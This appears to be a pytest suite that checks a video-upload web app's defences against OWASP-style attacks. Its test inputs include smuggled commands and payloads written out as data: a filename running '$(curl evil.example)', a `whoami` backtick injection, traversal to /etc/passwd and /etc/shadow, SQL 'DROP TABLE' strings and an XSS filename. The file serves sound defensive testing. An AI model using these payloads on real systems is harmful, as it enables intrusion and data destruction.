"""Real-world security injection tests.

Each test uploads or submits a crafted malicious payload and asserts that the
system rejects it or handles it safely — without executing, leaking, or storing
the payload.

Test categories map to OWASP assertions displayed on /security:
  - file_upload:     magic-byte mismatch, EICAR, oversized, null bytes
  - path_traversal:  filename path traversal vectors
  - injection:       shell / SQL injection in filenames and fields
  - sec_headers:     HTTP security headers present on all routes
  - idor:            cross-session task access blocked
  - broken_auth:     API key enforcement

Fixture files (tests/fixtures/*.mp4) are pre-built malicious payloads.
Run  tests/fixtures/generate_fixtures.py  to regenerate them.
"""

import struct
from pathlib import Path

from fastapi.testclient import TestClient

from app.main import app

FIXTURES = Path(__file__).parent / "fixtures"

client = TestClient(app, base_url="https://testserver")


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _fixture(name: str) -> bytes:
    p = FIXTURES / name
    if p.exists():
        return p.read_bytes()
    # Fallback: generate inline if fixtures dir not present
    return _mp4_ftyp() + b"inline fallback content"


def _mp4_ftyp() -> bytes:
    """Minimal 24-byte ISO MP4 file-type box."""
    return (
        struct.pack(">I", 24)   # box size
        + b"ftyp"               # box type
        + b"mp42"               # major brand
        + struct.pack(">I", 0)  # minor version
        + b"mp42isom"           # compatible brands
    )


# ---------------------------------------------------------------------------
# CATEGORY: file_upload
# ---------------------------------------------------------------------------

class TestFileUploadSecurity:
    """owasp:file_upload — extension / magic-byte validation."""

    def test_wrong_extension_rejected(self):
        """Plain-text file with .txt extension is rejected."""
        r = client.post("/upload", files={"file": ("malicious.txt", b"plain text content", "text/plain")})
        assert r.status_code in (400, 415, 422), f"Expected rejection, got {r.status_code}"

    def test_executable_extension_rejected(self):
        """EXE extension is always rejected."""
        r = client.post("/upload", files={"file": ("payload.exe", b"MZ" + b"\x00" * 64, "application/octet-stream")})
        assert r.status_code in (400, 415, 422)

    def test_pdf_extension_rejected(self):
        """PDF extension is rejected — not in allowlist."""
        r = client.post("/upload", files={"file": ("invoice.pdf", b"%PDF-1.4 fake pdf", "application/pdf")})
        assert r.status_code in (400, 415, 422)

    def test_html_disguised_as_mp4_not_reflected(self):
        """HTML content claiming to be mp4 — script tag must not appear in response."""
        html = _fixture("wrong_ext_html.mp4")
        r = client.post("/upload", files={"file": ("video.mp4", html, "video/mp4")})
        assert b"<script>" not in r.content

    def test_eicar_payload_not_reflected(self):
        """EICAR AV test string inside mp4 wrapper is not echoed back (fixture: eicar_mp4.mp4)."""
        payload = _fixture("eicar_mp4.mp4")
        r = client.post("/upload", files={"file": ("test_eicar.mp4", payload, "video/mp4")})
        assert b"EICAR-STANDARD-ANTIVIRUS-TEST-FILE" not in r.content

    def test_polyglot_mp4_html_script_not_reflected(self):
        """Polyglot MP4+HTML file — <script> tag must not appear in response (fixture: polyglot_mp4_html.mp4)."""
        payload = _fixture("polyglot_mp4_html.mp4")
        r = client.post("/upload", files={"file": ("polyglot.mp4", payload, "video/mp4")})
        assert b"<script>" not in r.content

    def test_null_bytes_in_content_no_500(self):
        """File with null bytes in content does not crash the server (fixture: null_bytes.mp4)."""
        payload = _fixture("null_bytes.mp4")
        r = client.post("/upload", files={"file": ("nullbytes.mp4", payload, "video/mp4")})
        assert r.status_code < 500, f"Server crashed on null-byte file: {r.status_code}"


# ---------------------------------------------------------------------------
# CATEGORY: path_traversal
# ---------------------------------------------------------------------------

class TestPathTraversal:
    """owasp:path_traversal — filename sanitization."""

    def test_dotdot_filename_no_500(self):
        """../../etc/passwd filename must not reach the filesystem."""
        payload = _fixture("path_traversal.mp4")
        r = client.post("/upload", files={"file": ("../../etc/passwd.mp4", payload, "video/mp4")})
        assert r.status_code < 500

    def test_windows_path_separator_no_500(self):
        """Windows backslash path in filename is sanitized."""
        payload = _fixture("path_traversal.mp4")
        r = client.post("/upload", files={"file": (r"C:\Windows\System32\cmd.mp4", payload, "video/mp4")})
        assert r.status_code < 500

    def test_null_byte_in_filename_no_500(self):
        """Null byte in filename (classic extension bypass) is handled safely."""
        payload = _fixture("path_traversal.mp4")
        r = client.post("/upload", files={"file": ("video\x00.mp4", payload, "video/mp4")})
        assert r.status_code < 500

    def test_absolute_path_in_filename_no_500(self):
        """/etc/shadow style absolute path is handled safely."""
        payload = _fixture("path_traversal.mp4")
        r = client.post("/upload", files={"file": ("/etc/shadow", payload, "video/mp4")})
        assert r.status_code < 500

    def test_url_encoded_traversal_no_500(self):
        """%2e%2e%2f encoded path traversal is handled safely."""
        payload = _fixture("path_traversal.mp4")
        r = client.post("/upload", files={"file": ("%2e%2e%2fetc%2fpasswd.mp4", payload, "video/mp4")})
        assert r.status_code < 500


# ---------------------------------------------------------------------------
# CATEGORY: injection
# ---------------------------------------------------------------------------

class TestInjection:
    """owasp:injection — shell and SQL injection in filenames."""

    def test_shell_injection_filename_no_500(self):
        """Shell metacharacters in filename do not cause 500 or command execution."""
        payload = _fixture("shell_injection.mp4")
        r = client.post("/upload", files={"file": ("$(curl evil.example).mp4", payload, "video/mp4")})
        assert r.status_code < 500

    def test_backtick_injection_no_500(self):
        """`whoami`.mp4 style backtick injection does not cause 500."""
        payload = _fixture("shell_injection.mp4")
        r = client.post("/upload", files={"file": ("`whoami`.mp4", payload, "video/mp4")})
        assert r.status_code < 500

    def test_sql_injection_filename_no_500(self):
        """SQL injection string in filename is sanitized without server error."""
        payload = _fixture("sql_injection.mp4")
        r = client.post("/upload", files={"file": ("'; DROP TABLE tasks; --.mp4", payload, "video/mp4")})
        assert r.status_code < 500

    def test_xss_filename_not_reflected(self):
        """XSS payload in filename is not reflected unescaped in response."""
        payload = _fixture("xss_filename.mp4")
        r = client.post("/upload", files={"file": ("<img src=x onerror=alert(1)>.mp4", payload, "video/mp4")})
        assert b"<img src=x" not in r.content
        assert b"onerror=" not in r.content


# ---------------------------------------------------------------------------
# CATEGORY: sec_headers
# ---------------------------------------------------------------------------

class TestSecurityHeaders:
    """owasp:sec_headers — HTTP security headers on every response."""

    def test_x_content_type_options(self):
        r = client.get("/health")
        assert r.headers.get("x-content-type-options", "").lower() == "nosniff"

    def test_x_frame_options(self):
        r = client.get("/health")
        xfo = r.headers.get("x-frame-options", "").upper()
        assert xfo in ("DENY", "SAMEORIGIN"), f"x-frame-options missing or weak: {xfo!r}"

    def test_referrer_policy(self):
        r = client.get("/health")
        assert r.headers.get("referrer-policy", "") != "", "referrer-policy header missing"

    def test_permissions_policy(self):
        r = client.get("/health")
        pp = r.headers.get("permissions-policy", "")
        assert "camera" in pp, f"permissions-policy missing camera directive: {pp!r}"

    def test_no_framework_version_in_server_header(self):
        """Server header must not expose uvicorn/Python version."""
        r = client.get("/health")
        server = r.headers.get("server", "").lower()
        assert "python" not in server

    def test_csp_present(self):
        """Content-Security-Policy header must be present."""
        r = client.get("/health")
        assert "content-security-policy" in r.headers


# ---------------------------------------------------------------------------
# CATEGORY: idor
# ---------------------------------------------------------------------------

class TestIDOR:
    """owasp:idor — task ownership enforcement."""

    def test_nonexistent_task_returns_404(self):
        """Requesting a non-existent task ID must return 404, not 200 or 500."""
        fake_id = "00000000-0000-0000-0000-000000000001"
        r = client.get(f"/progress/{fake_id}")
        assert r.status_code in (404, 422), f"Expected 404, got {r.status_code}: {r.text}"

    def test_download_nonexistent_task_returns_404(self):
        """Downloading a non-existent task must return 404."""
        fake_id = "00000000-0000-0000-0000-000000000002"
        r = client.get(f"/download/{fake_id}/srt")
        assert r.status_code == 404

    def test_malformed_task_id_no_500(self):
        """Malformed task IDs are rejected with 4xx, not 500."""
        r = client.get("/progress/../../etc/passwd")
        assert r.status_code in (400, 404, 422), f"Got {r.status_code}"


# ---------------------------------------------------------------------------
# CATEGORY: broken_auth
# ---------------------------------------------------------------------------

class TestBrokenAuth:
    """owasp:broken_auth — API key enforcement and public route access."""

    def test_health_accessible_without_key(self):
        """Health check is a public route — no auth required."""
        r = client.get("/health")
        assert r.status_code == 200

    def test_root_accessible_without_key(self):
        """Root route is public."""
        r = client.get("/")
        assert r.status_code == 200

    def test_garbage_api_key_does_not_crash(self):
        """Garbage API key returns 401/403/405, not 500."""
        r = client.get("/upload", headers={"X-API-Key": "' OR 1=1; --"})
        assert r.status_code in (200, 401, 403, 405)

    def test_sql_injection_in_api_key_no_crash(self):
        """SQL injection in X-API-Key header on public route does not crash."""
        r = client.get("/health", headers={"X-API-Key": "'; DROP TABLE users; --"})
        assert r.status_code == 200
